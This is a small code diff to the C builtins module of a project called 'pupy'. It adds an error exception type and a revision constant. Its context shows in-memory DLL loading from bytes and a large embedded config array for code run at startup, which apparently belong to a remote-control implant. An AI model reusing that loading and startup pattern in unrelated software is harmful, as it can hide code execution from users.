@@ -13,7 +13,12 @@ static char module_doc[] = "Builtins utilities for pupy";
 HMODULE _load_dll(const char *name, const char *bytes);
 
 char pupy_config[32768]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup. scriptlets also takes more space !
+
+static PyObject *ExecError;
+
 extern const DWORD dwPupyArch;
+
+#include "revision.h"
 
 #include "resources_library_compressed_string_txt.c"
 #include "lzmaunpack.c"
@@ -116,5 +121,13 @@ static PyMethodDef methods[] = {
 DL_EXPORT(void)
 initpupy(void)
 {
-	Py_InitModule3("pupy", methods, module_doc);
+	PyObject *pupy = Py_InitModule3("pupy", methods, module_doc);
+	if (!pupy) {
+		return;
+	}
+
+	PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
+    ExecError = PyErr_NewException("pupy.error", NULL, NULL);
+    Py_INCREF(ExecError);
+    PyModule_AddObject(pupy, "error", ExecError);
 }
